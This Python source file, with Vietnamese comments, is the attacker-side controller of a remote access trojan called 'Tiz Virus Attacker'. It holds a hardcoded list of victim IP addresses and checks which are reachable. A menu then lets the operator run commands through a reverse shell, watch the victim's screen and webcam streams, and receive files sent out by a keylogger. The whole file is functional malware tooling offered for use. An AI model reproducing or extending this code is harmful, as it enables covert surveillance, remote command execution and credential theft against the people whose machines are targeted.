# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""

from __future__ import division
import numpy as np
import socket, argparse, sys, threading, os
import subprocess

# Danh sách các địa chỉ IP của victim
VICTIM_IPS = ['192.168.1.68','192.168.1.6', '10.0.2.15', '10.10.26.55']


def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
    cli_args.add_argument('--port', help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
    options = cli_args.parse_args(sys.argv[1:])
  
    options.hosts = VICTIM_IPS
    return options

def check_victim_status(hosts, port):
    victims_status = {}
    for host in hosts:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)  # Set timeout to 1 second
            s.connect((host, port))
            victims_status[host] = "Reachable"
            s.close()
        except socket.error:
            victims_status[host] = "Not reachable"
    return victims_status

def choose_victim(victims_status):
    print("Victim Status:")
    for i, (host, status) in enumerate(victims_status.items(), 1):
        print(f"{i}. {host} - {status}")
    
    while True:
        choice = input(f"Choose victim to connect (1-{len(victims_status)}): ")
        if choice.isdigit() and 1 <= int(choice) <= len(victims_status):
            selected_host = list(victims_status.keys())[int(choice) - 1]
            # Kiểm tra trạng thái là "Reachable"
            if victims_status[selected_host] == "Reachable":
                return selected_host
            else:
                print(f"Victim {selected_host} is not reachable.")
        else:
            print("Invalid choice, try again.")

def display_action_menu():
    print("\n--- Action Menu ---")
    print("1. Execute Command via Reverse Shell")
    print("2. Stream Screen")
    print("3. Stream Camera")
    print("4. Receive File (Keylogger)")
    print("5. Exit")
    
    while True:
        choice = input("\nChoose an action (1-5): ")
        if choice.isdigit() and 1 <= int(choice) <= 5:
            return int(choice)
        else:
            print("Invalid choice, try again.")

# Reverse shell receiver
def R_tcp(selected_host, port=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    BUFFER_SIZE = 4096
    s.connect((selected_host, port))
    print(f"Connected to victim at {selected_host}:{port}")
    
    while True:
        command = input("Enter the command you want to execute (or type 'exit' to disconnect): ")
        s.send(command.encode())
        
        if command.lower() == "exit":
            print("Exiting reverse shell...")
            break
        
        results = s.recv(BUFFER_SIZE).decode()
        
        if not results:
            print("No output received.")
        else:
            print(results)
    
    s.close()

# Screen receiver
def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf

def screenreceiver(host, port):
    import pygame, zlib
    WIDTH = 1900
    HEIGHT = 1000
    pygame.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    clock = pygame.time.Clock()
    with socket.socket() as sock:
        sock.connect((host, port))
        watching = True
        while watching:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    watching = False
                    break
            size_len = int.from_bytes(sock.recv(1), byteorder='big')
            size = int.from_bytes(sock.recv(size_len), byteorder='big')
            pixels = recvall(sock, size)
            pixels = zlib.decompress(pixels)
            img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')
            screen.blit(img, (0, 0))
            pygame.display.flip()
            clock.tick(60)

# Camera receiver
def dump_buffer(s):
    """ Emptying buffer frame """
    while True:
        seg, addr = s.recvfrom(MAX_DGRAM)
        if struct.unpack("B", seg[0:1])[0] == 1:
            break

def camreceiver(host, port): 
    import cv2
    import numpy as np
    import struct

    s = socket.socket()
    s.connect((host, port))
    dat = b''
    while True:
        seg, addr = s.recvfrom(MAX_DGRAM)
        if struct.unpack("B", seg[0:1])[0] > 1:
            dat += seg[1:]
        else:
            dat += seg[1:]
            print(f"Received data size: {len(dat)} bytes")
            try:
                img = cv2.imdecode(np.frombuffer(dat, dtype=np.uint8), cv2.IMREAD_COLOR)
                if img is not None and img.size > 0:
                    cv2.imshow('frame', img)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        break
                else:
                    print("Failed to decode image: Image is None or empty")
            except Exception as e:
                print(f"Error decoding image: {e}")
            dat = b''
    cv2.destroyAllWindows()
    s.close()

def receive_file(host, port, save_directory='received_files'):
   
    if not os.path.exists(save_directory):
        os.makedirs(save_directory)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"Listening for files on {host}:{port}")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                try:
                    # Receive and decode the file metadata (name and size)
                    file_info = conn.recv(1024).strip().decode('utf-8')
                    if not file_info:
                        print("No more file info received.")
                        break

                    # Split the received info into file name and file size
                    filename, filesize = file_info.split('|')
                    filesize = int(filesize)
                    print(f"Receiving {filename} with size {filesize} bytes")

                    # Save the file in the specified directory
                    filepath = os.path.join(save_directory, filename)
                    with open(filepath, 'wb') as f:
                        remaining = filesize
                        while remaining > 0:
                            chunk_size = 4096 if remaining >= 4096 else remaining
                            chunk = conn.recv(chunk_size)
                            if not chunk:
                                break
                            f.write(chunk)
                            remaining -= len(chunk)
                        print(f"Received {filename} successfully! Saved to {filepath}")
                except Exception as e:
                    print(f"Error receiving file: {e}")
                    break

if __name__ == '__main__':
    options = parseargs()
    
    while True:
        victims_status = check_victim_status(options.hosts, options.port)
        selected_host = choose_victim(victims_status)

        while True:
            action = display_action_menu()

            if action == 1:  # Reverse Shell
                R_tcp(selected_host, options.port)

            elif action == 2:  # Stream Screen
                threadscreen = threading.Thread(target=screenreceiver, args=(selected_host, options.port + 1))
                threadscreen.start()
                threadscreen.join()  # Chờ tiến trình screen stream kết thúc trước khi hiển thị menu tiếp theo

            elif action == 3:  # Stream Camera
                MAX_DGRAM = 2 ** 16
                threadcam = threading.Thread(target=camreceiver, args=(selected_host, options.port + 2))
                threadcam.start()
                threadcam.join() 

            elif action == 4:  # Receive File (Keylogger)
                file_transfer_port = options.port + 3
                threadfile = threading.Thread(target=receive_file, args=("0.0.0.0", file_transfer_port))
                threadfile.start()
                threadfile.join()  

            elif action == 5:  # Exit
                print("Exiting action menu and choosing another victim...")
                break  